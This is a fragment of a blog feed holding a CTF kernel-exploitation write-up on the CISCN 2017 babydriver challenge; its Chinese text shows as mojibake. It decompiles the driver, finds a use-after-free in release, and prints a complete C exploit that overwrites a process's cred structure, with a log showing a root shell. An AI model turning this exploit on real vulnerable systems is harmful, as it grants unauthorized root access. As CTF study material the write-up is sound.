class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ioctl">ioctl</h2><p>ioctlæä¾›äº†ä¸€ä¸ªè°ƒç”¨kmallocé‡æ–°åˆ†é…bufçš„æ¥å£ï¼Œè¿™é‡Œçš„v4æ˜¯æˆ‘ä»¬ç”¨æˆ·æ€å¯ä»¥æ§åˆ¶çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é‡æ–°åˆ†é…size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command, arg);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="release">release</h2><p>å¯¹äºæ­£å¸¸çš„é©±åŠ¨ï¼Œreleaseå‡½æ•°ä¼šåœ¨æ–‡ä»¶å…³é—­çš„æ—¶å€™è§¦å‘ã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°æ²¡æœ‰åœ¨dataæ®µå¼€å¤´çš„file_operationsé‡Œæ³¨å†Œï¼Œåè€Œåœ¨<code>__mount_loc</code>èŠ‚ä¸­æŸ¥åˆ°äº†å¼•ç”¨ï¼Œä¸çŸ¥é“æ€ä¹ˆè§¦å‘çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>releaseæœ‰ä¸€ä¸ªUAFï¼Œkfreeä½†å…¨å±€å˜é‡æŒ‡é’ˆä¸ç½®ç©ºã€‚</p><p>æ€»ä½“æ¥çœ‹æ¶‰åŠkmallocå’Œkfree, å¯èƒ½ä¸å†…æ ¸çš„å †åˆ©ç”¨æœ‰å…³ã€‚æ‰€ä»¥ä¸‹é¢å…ˆä»‹ç»ä¸€ä¸‹å†…æ ¸çš„å†…å­˜ç®¡ç†æœºåˆ¶ã€‚</p><blockquote><p>ç¯‡å¹…è€ƒè™‘ï¼Œç›¸å…³å†…å®¹å•å¼€äº†ä¸€ç¯‡blogï¼Œ<a href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">ç‚¹æ­¤è·³è½¬</a></p></blockquote><h1>UAF</h1><blockquote><p>å‚è€ƒè‡ª <a href="https://www.anquanke.com/post/id/259252#h2-2">åœ¨2021å¹´å†çœ‹ciscn2017 babydriver</a></p></blockquote><h2 id="1-ç®€å•ç²—æš´â€”â€”4-4-72ç‰ˆæœ¬uafå¿…å®šå¯¼è‡´ææƒ">1. ç®€å•ç²—æš´â€”â€”4.4.72ç‰ˆæœ¬uafå¿…å®šå¯¼è‡´ææƒ</h2><p>å¦‚æœäº†è§£äº†slabæˆ‘ä»¬å°±èƒ½çŸ¥é“ï¼Œåœ¨kfreeåè¿™ä¸ªobjectä¼šè¢«æ”¾å›å…¶åŸæœ¬çš„listä¸­ï¼ˆæ¯”å¦‚kmem_cpu_cacheçš„slabåˆ—è¡¨ï¼‰ï¼Œå¹¶ä¸”freelistçš„ç¬¬ä¸€ä¸ªä¹Ÿä¼šæŒ‡å‘å®ƒã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½å¤Ÿä¿è¯ï¼Œåªè¦freeè¿›å»åæ²¡æœ‰åˆ«çš„æ“ä½œè¿ç»­ç”³è¯·ç›¸åŒå¤§å°çš„å¯¹è±¡ï¼Œä¸‹ä¸€æ¬¡ä¸€å®šä¼šè¿”å›è¿™ä¸€ä¸ªã€‚</p><p>çŸ¥é“äº†è¿™ä¸ªæˆ‘ä»¬å°±æœ‰å¾ˆå¤šçš„åˆ©ç”¨æ–¹æ³•äº†ã€‚ä¸€ç§æ¯”è¾ƒç®€å•çš„æ–¹æ³•å°±æ˜¯æŠŠå®ƒæ”¹æˆcredçš„å¤§å°ç„¶åç”¨æˆ·æ€forkèµ·shellï¼Œé€šè¿‡UAFç›´æ¥æ”¹æ‰euidã€‚è¿™ä¸ªæ¼æ´åœ¨kernel 4.4.72æ˜¯å¯ç”¨çš„ï¼Œæ˜¾ç„¶æ˜¯å› ä¸ºå†…æ ¸å¹¶æ²¡æœ‰ç›¸å…³çš„æ£€æŸ¥â€”â€”è‡³å°‘è¿™é“é¢˜çš„å†…æ ¸æ²¡æœ‰</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/ $ <span class="built_in">whoami</span></span><br><span class="line">ctf</span><br><span class="line">/ $ ./ez_uaf</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[   11.928864] device open</span><br><span class="line">[   11.929808] device open</span><br><span class="line">[   11.931073] alloc <span class="keyword">done</span></span><br><span class="line">[   11.932012] device release</span><br><span class="line">[+] Successful to get the root. Execve root shell now...</span><br><span class="line">/ <span class="comment"># ls</span></span><br><span class="line">bin          dev          ez_uaf.c     lib          root         sys</span><br><span class="line">boot.sh      etc          home         linuxrc      rootfs.cpio  tmp</span><br><span class="line">bzImage      ez_uaf       init         proc         sbin         usr</span><br><span class="line">/ <span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>); <span class="comment">// credå¤§å°</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to fork the new thread, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) <span class="comment">// the child thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, buf, <span class="number">28</span>); <span class="comment">// UAF </span></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Unable to get the root, exploit failed.\033[0m\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// the parent thread</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);<span class="comment">//waiting for the child</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ›´å¤æ‚çš„åˆ©ç”¨â€”â€”4-5-ç‰ˆæœ¬">2. æ›´å¤æ‚çš„åˆ©ç”¨â€”â€”4.5+ç‰ˆæœ¬</h2><p>åœ¨è¿™ä¸ªç‰ˆæœ¬ï¼Œä¸ºcredåˆ†é…çš„slab å¯¹è±¡æ± <code>cred_jar</code>åœ¨åˆå§‹åŒ–çš„æ—¶å€™æ·»åŠ äº†ä¸€ä¸ªflagä½<code>SLAB_ACCOUNT</code>ï¼Œè¿™å¯¼è‡´è¿™æ ·çš„é—®é¢˜ï¼Œå†…æ ¸é©±åŠ¨ä¸­æ‰‹åŠ¨è°ƒç”¨çš„kmallocè™½ç„¶å¤§å°ä¸€æ ·ï¼Œä½†æ˜¯å’Œcred_jarä¸å†å…±äº«ä¸€ä¸ªå¯¹è±¡æ± ã€‚</p><p>è¿™ä¸ªæ—¶å€™è¦å¼•å‡ºé€šç”¨çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆï¼šåŠ«æŒtty_struct.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;é¢˜ç›®åˆ†æ&lt;/h1&gt;
&lt;p&gt;initå’Œexitæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šå†…å®¹ï¼Œå°±æ˜¯æ­£å¸¸çš„æ³¨å†Œå’Œææ„ã€‚æ³¨å†Œäº†ä¸€ä¸ªåå«&lt;code&gt;babydev&lt;/code&gt;çš„å­—ç¬¦è®¾å¤‡ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜åœ¨bssæœ‰ä¸€ä¸ªå…¨å±€å˜é‡ï¼ŒåŒ…å«äº†ä¸€ä¸ªbufæŒ‡é’ˆå’Œä¸€ä¸ªé•¿åº¦å­—æ®µã€‚ä¸‹é¢çœ‹çœ‹è¿™ä¸ªé©±åŠ¨åœ¨å¹²å˜›ï¼š&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
</feed>
